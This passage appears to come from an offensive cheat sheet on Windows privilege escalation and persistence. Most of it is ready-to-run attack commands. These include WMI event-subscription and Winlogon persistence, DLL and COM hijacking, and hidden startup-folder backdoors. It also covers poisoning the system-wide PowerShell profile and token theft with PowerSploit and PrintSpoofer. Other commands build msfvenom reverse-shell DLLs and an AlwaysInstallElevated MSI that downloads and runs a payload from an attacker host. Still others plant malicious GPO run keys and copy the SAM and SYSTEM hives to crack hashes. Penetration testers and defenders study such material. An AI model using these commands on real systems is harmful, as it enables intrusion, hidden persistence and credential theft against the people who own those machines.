	Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "powershell.exe -NoProfile -WindowStyle Hidden -Command <command_or_script_path>,"
	```

# Windows Management Instrumentation (WMI)

#### WMI Query and Execution
- This command queries all running processes using WMI:
    ```powershell
    Get-WmiObject -Query "Select * from Win32_Process"
    ```
- Note: While `Get-WmiObject` is still commonly used, `Get-CimInstance` is a more modern and efficient cmdlet:
    ```powershell
    Get-CimInstance -Query "Select * from Win32_Process"
    ```

#### Execute a Command via WMI
- Execute a Command via WMI:
	```powershell
	Invoke-WmiMethod -Path Win32_Process -Name Create -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Path\To\malicious.ps1"
	```

#### Create a Persistent WMI Event Subscription
- This sets up a persistent WMI event subscription for persistence, where a command will be executed when the event is triggered (in this case, at a specific time):
    ```powershell
    # Define an Event Filter that triggers when the system time reaches 1 PM
    $Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
        Name="PersistentFilter"; 
        EventNamespace="root\cimv2"; 
        QueryLanguage="WQL"; 
        Query="Select * From __InstanceModificationEvent Within 60 
               Where TargetInstance Isa 'Win32_LocalTime' And TargetInstance.Hour = 13"
    }
    
    # Create a Consumer that runs a PowerShell script when the event is triggered
    $Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
        Name="PersistentConsumer"; 
        CommandLineTemplate="powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Path\To\malicious.ps1"
    }

    # Bind the Filter and Consumer to establish the subscription
    Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
        Filter=$Filter; 
        Consumer=$Consumer
    }
    ```

# DLL Hijacking

DLL Hijacking occurs when an application or service loads a Dynamic Link Library (DLL) from a location where an attacker has placed a malicious DLL due to improper directory or path permissions.

## Identifying Vulnerable DLLs

#### View All DLLs Loaded for a Specific Process
To check the DLLs loaded by a specific process, use its PID (Process ID):
```powershell
Get-Process -Id <PID> | Select-Object -ExpandProperty Modules | Select-Object ModuleName, FileName
```

#### View All DLLs Loaded by Running Processes
You can inspect the DLLs loaded by all currently running processes. This can help identify potential target DLLs for hijacking.
```powershell
Get-Process | ForEach-Object { $_.Modules } | Where-Object { $_.ModuleName -like "*.dll" } | Select-Object ModuleName, FileName
```

#### Find Vulnerable Services for DLL Hijacking
Search for services that are executing from insecure directories such as `System32`, where DLL hijacking may be possible:
```powershell
Get-WmiObject Win32_Service | Where-Object { $_.PathName -match "System32" } | Select-Object Name, PathName
```

#### Search for DLL Files in Vulnerable Directories
You can list all DLL files in a potentially vulnerable directory (with insecure permissions) and check the permissions of specific DLLs:
```powershell
Get-ChildItem -Path "C:\Vulnerable\Directory" -Recurse | Where-Object { $_.Extension -eq '.dll' }
icacls "C:\Vulnerable\Directory\SomeDLL.dll"
```

#### Look for Unquoted Service Paths
Unquoted service paths can be exploited to load malicious DLLs. These services may load DLLs from unintended directories if the path is not properly enclosed in quotes.
```powershell
Get-WmiObject -Query "SELECT * FROM Win32_Service WHERE PathName LIKE '% %'"
```

#### Identify Writable DLLs Loaded by Processes
```powershell
# Set up output file paths
$Step1_OutputFilePath = "E:\Step1_DLL_ACL.txt"
$Step2_OutputFilePath = "E:\Step2_DLL_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 and Step 2 output files (ACL data collection)
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Query all running processes
$processes = Get-Process

# Initialize variables to hold the current process and loaded DLL details
$currentProcess = ""
$currentACL = @()

# Iterate over each process and retrieve the list of loaded DLLs
foreach ($process in $processes) {
    try {
        # Get the list of loaded modules (DLLs) for the current process
        $dlls = $process.Modules | Where-Object { $_.ModuleName -like "*.dll" } | ForEach-Object { $_.FileName }
        
        # Process each loaded DLL
        foreach ($dll in $dlls) {
            $cleanDLLPath = $dll -replace '"', '' # Remove any surrounding quotes from the path

            # Check if the DLL path is valid and get the ACL details
            if (Test-Path $cleanDLLPath) {
                try {
                    # Get the ACL information for the DLL
                    $acl = Get-Acl -Path $cleanDLLPath | Format-List | Out-String -Width 300

                    # Write the DLL path and ACL details to the Step 1 output file
                    "DLL Path: $cleanDLLPath" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                    $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                    "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

                    # Add ACL entries for matching
                    $aclEntries = $acl -split "`n"
                    $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }

                    # Check for matches in the ACL entries
                    $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

                    # If any matching ACL entry is found, write the DLL and matching ACLs to the Step 2 output file
                    if ($matchingEntries.Count -gt 0) {
                        "DLL Path: $cleanDLLPath" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
                        $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
                        "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
                    }
                }
                catch {
                    # If an error occurs (e.g., if the DLL path doesn't exist), log it to the output file
                    "Failed to retrieve ACL for DLL: $cleanDLLPath" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                    "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
                }
            }
        }
    }
    catch {
        # Log any error retrieving DLLs for the process
        "Failed to retrieve DLLs for process: $($process.Name) (PID: $($process.Id))" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

## Exploiting DLL Hijacking

#### Step 1: Create a Malicious DLL
To exploit DLL hijacking, first create a malicious DLL payload. You can use `msfvenom` to generate a DLL payload that will execute a reverse shell or similar malicious code:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f dll -o malicious.dll
```

#### Step 2: Place the Malicious DLL in the Target Directory
Once the DLL is generated, place it in the directory where the vulnerable service or application will load it. Ensure the directory has appropriate permissions for the DLL to be executed:
```powershell
Copy-Item -Path "C:\Path\To\malicious.dll" -Destination "C:\Vulnerable\Directory\malicious.dll"
```

#### Step 3: Restart the Service or Program
After placing the malicious DLL in the appropriate directory, restart the vulnerable service or application to trigger the loading of your malicious DLL:
```powershell
Restart-Service -Name "<service_name>"
```
Or restart the target program manually, depending on the context of the hijacking.

# Component Object Model (COM) Hijacking

Privilege escalation using COM hijacking can be achieved by identifying a vulnerable COM object that runs with elevated privileges (like SYSTEM or Administrator) and modifying its registry entry to load a malicious DLL or executable. When a lower-privileged user triggers the COM object, the system will execute the payload with higher privileges.

#### View Registered COM Objects
To enumerate COM objects currently registered on the system:

```powershell
Get-ItemProperty -Path 'HKLM:\Software\Classes\CLSID\'
```

#### Check Permissions
Ensure that the identified COM object has misconfigured permissions that allow lower-privileged users (like your current user) to modify its registry keys. You can check permissions using:

```powershell
$acl = Get-Acl -Path 'HKLM:\Software\Classes\CLSID\{<GUID>}\InprocServer32'
$acl.Access
```

#### Hijack an Existing COM Object for Persistence
Once you've found a vulnerable COM object that is invoked by a privileged process and is modifiable, hijack it by pointing it to a malicious payload.

Example: replace the `InprocServer32` path of a vulnerable COM object to load a malicious DLL, which will execute with elevated privileges.

```powershell
Set-ItemProperty -Path 'HKLM:\Software\Classes\CLSID\{<GUID>}\InprocServer32' -Name '(Default)' -Value 'C:\path\to\malicious.dll'
```

Explanation:
- `{<GUID>}`: The CLSID of the vulnerable COM object that runs with elevated privileges.
- `InprocServer32`: The key where the path to the DLL is defined.
- `C:\path\to\malicious.dll`: Your malicious DLL that will run with elevated privileges when the COM object is invoked.

#### Hijack `LocalServer32` for Executable-Based Privilege Escalation
If the COM object loads an executable, you can hijack the `LocalServer32` key to execute your malicious code with elevated privileges.

```powershell
Set-ItemProperty -Path 'HKLM:\Software\Classes\CLSID\{<GUID>}\LocalServer32' -Name '(Default)' -Value 'C:\path\to\malicious.exe'
```

Explanation:
- `LocalServer32`: The key that points to an executable associated with the COM object.
- `C:\path\to\malicious.exe`: Your malicious executable that will run with SYSTEM or Administrator privileges.

#### Triggering the Hijacked COM Object
After modifying the COM object, you need to trigger its execution. If the COM object is invoked by a system process, it may automatically execute with elevated privileges. Otherwise, you can force it to run using PowerShell or by invoking the application that relies on the COM object.

You can use `PowerShell` to invoke the COM object programmatically:
```powershell
$comObject = [activator]::CreateInstance([type]::GetTypeFromCLSID("{<GUID>}"))
```
Replace `{<GUID>}` with the CLSID of the hijacked COM object. This invocation should now load your malicious payload with elevated privileges.

#### Privilege Escalation by Hijacking a COM Object in Excel
Suppose you’ve found that the CLSID for Microsoft Excel is vulnerable and runs under elevated privileges (for example, during certain system tasks). You can hijack it to escalate privileges by pointing it to a malicious DLL.
```powershell
$regPath = "HKLM:\Software\Classes\CLSID\{00020813-0000-0000-C000-000000000046}\InprocServer32"
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\path\to\malicious.dll"
```
Now, whenever Excel (or another application relying on that COM object) is executed by a privileged process, it will load and execute your malicious DLL with elevated privileges.

# Startup Folders

#### Locating Startup Folders
If a user or group has write access to a startup folder, you can add a malicious executable that will automatically run when the system starts.
- For all users startup (this applies to all users on the machine):
    ```powershell
    $StartupFolderAllUsers = $env:ALLUSERSPROFILE + "\Microsoft\Windows\Start Menu\Programs\Startup"
    Write-Host "All Users Startup Folder: $StartupFolderAllUsers"
    ```

#### Dropping a Payload in the Startup Folder
If you have write access to the appropriate startup folder, you can drop a malicious executable or script that will be executed when the system starts or when a user logs in.
- Copy an Executable to the All Users' Startup Folder:
	```powershell
	Copy-Item "<path_to_executable>" "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Startup\malicious_program.exe"
	```

This method places the executable in the startup folder, which ensures it runs whenever the target user or any user logs into the system.

#### Create a Shortcut for the All User's Startup Folder
Instead of placing the executable directly in the startup folder, you can create a shortcut (`.lnk` file) that points to the malicious executable. This allows for greater flexibility in pointing to external paths and makes the persistence method less obvious.
- Create a Shortcut for All Users:
	```powershell
	$WshShell = New-Object -ComObject WScript.Shell
	$StartupFolderAllUsers = $env:ALLUSERSPROFILE + "\Microsoft\Windows\Start Menu\Programs\Startup"
	$Shortcut = $WshShell.CreateShortcut("$StartupFolderAllUsers\system_backdoor.lnk")
	$Shortcut.TargetPath = "C:\Backdoor\backdoor.exe"
	$Shortcut.WorkingDirectory = "C:\Backdoor"
	$Shortcut.IconLocation = "C:\Backdoor\backdoor.ico"
	$Shortcut.Save()
	```

#### Hide Executable with Hidden Attributes
To further evade detection, the executable or shortcut file in the startup folder can be hidden using file attributes:
- Set Hidden and System File Attributes:
	```powershell
	$MaliciousFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious_program.exe"
	Set-ItemProperty -Path $MaliciousFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
	```

#### Verifying Persistence
After placing the malicious executable or shortcut in the startup folder, you can verify that it will indeed execute on the next startup by listing the contents of the startup folder:
- List Items in the Startup Folder (All Users):
	```powershell
	Get-ChildItem "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Startup"
	```

#### Additional Considerations
- Script Persistence: You can place PowerShell or batch scripts in the startup folder as well, which will execute automatically during startup. Example:
	```powershell
	Copy-Item "C:\path\to\payload.ps1" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious_script.ps1"
	```

# PowerShell Profile
PowerShell profiles are scripts that are executed automatically whenever a new PowerShell session starts. These can be exploited to establish persistence by modifying them to execute arbitrary code. There are four types of profiles, but the most commonly used for persistence are the user-specific and system-wide profiles:

- User Profile: `$PROFILE` (This is user-specific and located at `C:\Users\<Username>\Documents\WindowsPowerShell\profile.ps1`)
- System-Wide Profile: `"C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"` (This applies to all users on the system)

#### View System-Wide PowerShell Profile
The system-wide profile affects all users on the system. This command shows the contents of the global PowerShell profile:
```powershell
Get-Content -Path "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1"
```

#### Create a New System-Wide PowerShell Profile
To create a new system-wide PowerShell profile, administrative privileges are required. Attackers with elevated permissions can create or modify the system-wide profile for persistence:
```powershell
New-Item -Path "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" -ItemType File -Force
```

#### Modify System-Wide PowerShell Profile 
Attackers with **administrative privileges** can modify the system-wide profile to execute malicious code for **every user** on the machine, thereby achieving system-wide persistence:
```powershell
Add-Content -Path "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" -Value "Start-Process 'C:\Backdoor\backdoor.exe' -WindowStyle Hidden"
```
This is an escalation tactic that affects all users on the machine, providing a broader attack surface.

#### Persist via PowerShell ScriptBlock (Global/System Level)
To achieve persistence at the system level, this method can be used. It injects a script or executable call into the system-wide PowerShell profile:
```powershell
Add-Content -Path "C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1" -Value 'Register-ObjectEvent -InputObject $host -EventName Exiting -Action {Start-Process -NoNewWindow -FilePath "C:\path\to\malicious_program.exe"}'
```

# Abusing File and Folder Permissions

#### Identify Files with Insecure Permissions
- Find All Writable Files and Folders:
	```powershell
	Get-ChildItem -Path C:\ -Recurse -Force | ForEach-Object {
        $acl = Get-Acl $_.FullName
        $acl.Access | Where-Object { $_.FileSystemRights -match "Write" }
    } | Out-File 'C:\Path\To\OutFile'
	```
- Look for Files with Writable Permissions: Find files or directories with Full Control for `Everyone`.
	```powershell
	Get-ChildItem -Path C:\ -Recurse -Force | Where-Object { 
    (Get-Acl $_.FullName).Access | Where-Object { 
        $_.IdentityReference -eq "Everyone" -and $_.FileSystemRights -match "FullControl"
    }
} | Out-File 'C:\Path\To\OutFile'
	```
- Check permissions for specific files:
	```powershell
	Get-Acl C:\path\to\file | Format-List
	```
- Check permissions recursively for directories:
	```powershell
	icacls C:\path\to\directory /T /C
	```

#### Exploit Writable File to Gain Elevated Privileges
- If a sensitive file (such as a service binary) is writable by a non-privileged user, you can replace it with a malicious executable, which may be executed by a service or higher-privileged user, leading to privilege escalation

- Replace vulnerable files in sensitive locations with a malicious executable:
	```powershell
	Copy-Item -Path "C:\Path\To\malicious.dll" -Destination "C:\Path\To\WritableFile.bat"
	```
	Or, to copy a DLL:
	```powershell
	cp C:\Path\To\malicious.exe C:\Program Files\Vulnerable\app.exe
	```

#### Modify Vulnerable Files with Malicious Commands
- Modify vulnerable files with malicious commands:
	```powershell
	echo "powershell -NoProfile -ExecutionPolicy Bypass -Command Start-Process -FilePath 'C:\Path\To\malicious.exe'" > C:\Path\To\WritableFile.bat
	```

#### Common Target Directories
- Look for writable subdirectories:
	- `C:\Program Files`
	- `C:\Program Files (x86)
	- `C:\Windows\System32`
    Note: If any files in `C:\Windows\System32` or other critical system directories are writable, they are prime targets for privilege escalation.

    Critical Tip: Always test your access rights in non-destructive ways before replacing sensitive files to avoid corrupting critical system components.

# Path Variable Manipulation

#### Identify Writable Directories in `PATH`
```powershell
# Set up output file paths
$Step1_OutputFilePath = "E:\Step1_PATH_Directories_ACL.txt"
$Step2_OutputFilePath = "E:\Step2_PATH_Directories_ACL_Filtered.txt"

# Set a large width to prevent line wrapping
$PSDefaultParameterValues['Out-File:Width'] = 300

# Initialize Step 1 and Step 2 output files
New-Item -Path $Step1_OutputFilePath -ItemType File -Force | Out-Null
New-Item -Path $Step2_OutputFilePath -ItemType File -Force | Out-Null

# Regex patterns for matching ACL entries
$patterns = @(
    "Everyone .*Allow.*  .*FullControl.*",
    "Everyone .*Allow.*  .*Modify.*",
    "Everyone .*Allow.*  .*Write.*",
    "Everyone .*Allow.*  .*Delete.*",
    "Everyone .*Allow.*  .*TakeOwnership.*",
    "Everyone .*Allow.*  .*ChangePermissions.*",
    "BUILTIN\\Users .*Allow.*  .*FullControl.*",
    "BUILTIN\\Users .*Allow.*  .*Modify.*",
    "BUILTIN\\Users .*Allow.*  .*Write.*",
    "BUILTIN\\Users .*Allow.*  .*Delete.*",
    "BUILTIN\\Users .*Allow.*  .*TakeOwnership.*",
    "BUILTIN\\Users .*Allow.*  .*ChangePermissions.*",
    "$env:userdomain\\$env:username .*Allow.*  .*FullControl.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Modify.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Write.*",
    "$env:userdomain\\$env:username .*Allow.*  .*Delete.*",
    "$env:userdomain\\$env:username .*Allow.*  .*TakeOwnership.*",
    "$env:userdomain\\$env:username .*Allow.*  .*ChangePermissions.*"
)

# Get directories from $env:PATH
$pathDirectories = $env:PATH -split ';' | Where-Object { $_ -and (Test-Path $_) }

# Initialize variables to hold the current directory details
$currentDirectory = ""
$currentACL = @()

# Iterate over each directory in the PATH environment variable
foreach ($directory in $pathDirectories) {
    try {
        # Get the ACL information for the directory
        $acl = Get-Acl -Path $directory | Format-List | Out-String -Width 300

        # Write the directory path and ACL details to the Step 1 output file
        "Directory: $directory" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        $acl | Out-String | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability

        # Add ACL entries for matching
        $aclEntries = $acl -split "`n"
        $currentACL = $aclEntries | Where-Object { $_ -match ".*Allow.*" }

        # Check for matches in the ACL entries
        $matchingEntries = $currentACL | Where-Object { $_ -match ($patterns -join "|") }

        # If any matching ACL entry is found, write the directory and matching ACLs to the Step 2 output file
        if ($matchingEntries.Count -gt 0) {
            "Directory: $directory" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            $matchingEntries | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8
            "`n" | Out-File -FilePath $Step2_OutputFilePath -Append -Encoding UTF8 # Add a newline for readability
        }
    }
    catch {
        # If an error occurs (e.g., if the directory path doesn't exist), log it to the output file
        "Failed to retrieve ACL for directory: $directory" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
        "`n" | Out-File -FilePath $Step1_OutputFilePath -Append -Encoding UTF8
    }
}
```

#### Exploit Writable Directory
- Exploit Writable Directory: Add a malicious executable to a writable directory in the PATH.
	```powershell
	$writablePath = "C:\Path\To\WritableDirectory"
	$maliciousFile = "C:\Path\To\malicious.exe"
	
	# Ensure the destination directory is writable before copying
	if (Test-Path $writablePath -and (Get-Acl $writablePath).Access | Where-Object { 
	        $_.FileSystemRights -match 'Write' -and $_.AccessControlType -eq 'Allow'
	    }) {
	    Copy-Item -Path $maliciousFile -Destination $writablePath
	    Write-Host "Malicious file copied to $writablePath"
	} else {
	    Write-Host "The directory $writablePath is not writable by the current user."
	}
	```

# Token Manipulation

#### List All User Tokens
To enumerate all security tokens associated with your current session, including privileges:
```powershell
whoami /all
```
This will display all the privileges and groups associated with the current token.

#### Enable All Privileges for the Current User
You can attempt to enable all privileges for your current token using PowerSploit’s `Invoke-TokenManipulation`:
```powershell
Invoke-TokenManipulation -EnableAllPrivileges
```
	*Note: You need PowerSploit installed for this to work.*

#### Enumerate Privileged Tokens
You can check for privileged processes like `lsass.exe` (Local Security Authority Subsystem Service) and see which user owns the token:
```powershell
Get-WmiObject -Query "Select * from Win32_Process where Name='lsass.exe'" | ForEach-Object { $_.GetOwner().User }
```

#### List Process Handles and Tokens
To enumerate process IDs and handles (useful for token stealing or manipulation):
```powershell
Get-WmiObject -Class Win32_Process | Select-Object ProcessId, Name, Handle
```

#### Identify Processes Running as SYSTEM
To identify processes that are running under the `NT AUTHORITY\SYSTEM` user (useful for token impersonation):
```powershell
Get-Process | Where-Object { $_.Name -eq "lsass" -or $_.Name -eq "winlogon" -or $_.Name -eq "services" } | ForEach-Object { $_.Name, $_.Id, $_.Handles }
```
You can replace `"lsass"` with other potential processes like `winlogon` or `services`.

#### Abusing `SeImpersonatePrivilege`
1. Check If `SeImpersonatePrivilege` is Enabled:
To check the current privileges, including `SeImpersonatePrivilege`:
```powershell
whoami /priv
```
2. Abusing `SeImpersonatePrivilege`:
If the user has `SeImpersonatePrivilege`, this can be abused with tools like Juicy Potato, RoguePotato, or PrintSpoofer to escalate privileges to `SYSTEM`. These tools work by exploiting Windows COM behavior and allowing the user to impersonate privileged tokens.

For example, using PowerShell to check impersonation level:
```powershell
$command = "Start-Process powershell -ArgumentList 'whoami'"
Invoke-Command -ScriptBlock { [Security.Principal.WindowsIdentity]::GetCurrent() } | Select-Object -Property AuthenticationType, ImpersonationLevel
```
3. Running PrintSpoofer (as an example for `SeImpersonatePrivilege` abuse):
```powershell
Start-Process -FilePath "PrintSpoofer.exe" -ArgumentList "-i -c powershell.exe"
```
This command executes `PrintSpoofer` and runs a PowerShell process as SYSTEM if the privilege is exploitable.

#### Stealing Tokens (Requires `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`)
1. Steal a Token (PowerSploit):
If you have the necessary privileges (`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`), you can steal a token from another user:
```powershell
Invoke-TokenManipulation -Username <target_user> -ImpersonateUser
```
2. Impersonate a Token (e.g., SYSTEM):
If you want to impersonate the SYSTEM account, run:
```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
```
3. Create a Process with a Stolen Token:
Once you've stolen a token, you can spawn a new process under that token:
```powershell
Invoke-TokenManipulation -Username <target_user> -CreateProcess "powershell.exe"
```

#### Stealing Tokens from Running Processes
1. Identify Processes for Token Stealing:
To list processes on a remote machine that might have valuable tokens (like SYSTEM or Administrator) for token stealing:
```powershell
Invoke-Command -ComputerName <target> -ScriptBlock { Get-Process -IncludeUserName }
```
	*Note: The `-IncludeUserName` switch requires administrative privileges.*
1. Stealing a Token from a Process:
Using PowerSploit’s `Invoke-TokenManipulation`, you can impersonate a token from a specific process:
```powershell
Invoke-TokenManipulation -ProcessId <process_id> -ImpersonateUser
```
3. Verify Current Token:
You can check the current impersonated token with:
```powershell
[Security.Principal.WindowsIdentity]::GetCurrent()
```

# Abusing `AlwaysInstallElevated`

The `AlwaysInstallElevated` policy allows MSI (Microsoft Installer) packages to be installed with elevated privileges, specifically the SYSTEM account, even if the user has limited privileges. This policy is considered a misconfiguration and can be abused by attackers to escalate privileges.

#### Checking `AlwaysInstallElevated` Policy
To determine if the `AlwaysInstallElevated` policy is enabled on a Windows host, you need to check both the machine-level and user-level policy settings. If either or both are set to `1`, the system is vulnerable.

1. Check the local machine policy:
   ```powershell
   Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\Installer | Select-Object AlwaysInstallElevated
   ```

2. Check the current user policy:
   ```powershell
   Get-ItemProperty HKCU:\Software\Policies\Microsoft\Windows\Installer | Select-Object AlwaysInstallElevated
   ```

If either of these commands returns a value of `1` for `AlwaysInstallElevated`, the policy is enabled, and the system is vulnerable to privilege escalation.

#### Exploiting `AlwaysInstallElevated`
Once you confirm that the `AlwaysInstallElevated` policy is enabled, you can escalate privileges by creating a malicious MSI package that runs arbitrary code with SYSTEM privileges. Here's how to exploit this:

1. Create a malicious MSI package: You can use various tools (e.g., `msfvenom` or `msi_exec`) to create an MSI package that executes a payload. For example, using `msfvenom`:
   ```bash
   msfvenom -p windows/exec CMD='powershell.exe -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://<attack_ip>:<attack_port>/payload.ps1\')"' -f msi -o malicious.msi
   ```

   This command generates an MSI package (`malicious.msi`) that will download and execute a PowerShell payload hosted on your attack server.

2. Install the malicious MSI package: Use the following command to install the MSI package with elevated privileges:
   ```powershell
   msiexec /quiet /qn /i C:\Path\To\malicious.msi
   ```

   - `/quiet` and `/qn` suppress all user interface elements.
   - `/i` specifies the path to the MSI package to be installed.

Once the MSI is executed, the payload will run with SYSTEM privileges, allowing the attacker to escalate privileges on the host.

#### Verification
After successfully exploiting the vulnerability, you can verify privilege escalation by checking your current privilege level:
```powershell
whoami /priv
```
If you see SYSTEM privileges, the escalation was successful.

# Kernel Exploits and Vulnerable Drivers

#### Kernel and OS Version
- Displays detailed OS and patch information (look for known vulnerable versions):
	```powershell
	Get-ComputerInfo
	```
- Lists installed patches and hotfixes to identify unpatched systems:
	```powershell
	Get-HotFix
	```
- Lists drivers and their versions:
	```powershell
	Get-WmiObject -Class Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion
	```
- Check System Uptime:
	```powershell
	(Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
	```

#### Checking DEP/ASLR/SEHOP Status
- Check if Data Execution Prevention (DEP), Address Space Layout Randomization (ASLR), and Structured Exception Handler Overwrite Protection (SEHOP) are enabled on the system:
	```powershell
	Get-ProcessMitigation -System
	```
- Check process mitigation for a specific process (useful to identify if certain protections are disabled)
	```powershell
	Get-ProcessMitigation -Name explorer.exe
	```

#### Exploit Unpatched Kernel Vulnerabilities
- Search for public exploits for kernel vulnerabilities based on the Windows version and patch level.
- Note: Kernel exploits typically require administrator-level access to execute.

# Installed Software

#### Software Enumeration
- List Installed Programs:
	```powershell
	Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName, DisplayVersion
	```
- List Installed Software with Version and Install Date:
	```powershell
	Get-WmiObject -Class Win32_Product | Select-Object Name, Version, InstallDate
	```

# Group Policy Objects (GPOs)

Misconfigurations in Group Policy Objects (GPOs), especially if they grant excessive permissions or allow writable access to scripts, registry keys, or other sensitive resources, can provide significant privilege escalation vectors. These techniques are especially effective if the attacker gains access to modify GPOs that apply to privileged users or groups.

#### Identifying GPO Misconfigurations
- List all GPOs:
   ```powershell
   Get-GPO -All
   ```
- Generate a report of all Group Policy Objects (requires domain admin privileges):
	```powershell
	Get-GPOReport -All -ReportType HTML -Path "C:\GPOReport.html"
	```
- Check specific GPO settings:
   ```powershell
   Get-GPOReport -Name "<GPO Name>" -ReportType XML
   ```
- Retrieve the Resultant Set of Policy (RSoP) for the current user:
	```powershell
	gpresult /R
	```

#### View GPO Startup Scripts
- Retrieve current GPO startup scripts:
	```powershell
	Get-GPResultantSetOfPolicy -User <username> -ReportType XML | Select-String "Logon"
	```

#### Create Group Policy Preferences (GPP)
If you discover that a user has write access to a GPO or specific settings within it, you can modify it to gain elevated privileges.
- Create a malicious GPO:
   ```powershell
   New-GPO -Name "<Malicious GPO>"
   ```
- Set a registry key for persistence:
   ```powershell
   Set-GPRegistryValue -Name "<Malicious GPO>" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "<MaliciousKey>" -Value "<MaliciousCommand>"
   ```

#### Modifying GPO to Set Logon/Startup Scripts
- Add a malicious logon script for every user:
   ```powershell
   Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon' -Name 'Script' -Value 'C:\Backdoor\logon.ps1'
   ```
- Set a malicious startup registry entry:
   ```powershell
   Set-GPRegistryValue -Name "<GPO Name>" -Key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Malicious" -Value "C:\Path\To\Malicious.exe"
   ```

# Abusing Shadow Copies for Data Access

#### List All Shadow Copies
This command lists all available shadow copies on the target system. Shadow copies are backups of the system that can contain critical data such as registry hives and user files.
```powershell
vssadmin list shadows
```

#### Copying Files from Shadow Copies
The files stored in shadow copies are accessible through special paths that begin with `\\?\GLOBALROOT`. By copying these files, you can extract sensitive data like the SAM file (which stores password hashes) or user-specific files like `NTUSER.DAT` (which contains user profile information).

- Example: Copying the SAM File
The SAM file is part of the Windows registry that contains hashed user credentials. By copying it from a shadow copy, it becomes possible to extract password hashes for offline cracking or further attacks.
```powershell
Copy-Item -Path "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" -Destination "C:\Path\To\sam_copy"
```

- Example: Copying the SYSTEM Hive
To decrypt the SAM file password hashes, you need the SYSTEM hive, which contains the key required for decryption.
```powershell
Copy-Item -Path "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" -Destination "C:\Path\To\system_copy"
```

#### Mounting Shadow Copies for Full Access
Alternatively, you can mount a shadow copy to a drive letter or path, which allows you to access and browse its contents as if it were another partition or directory.

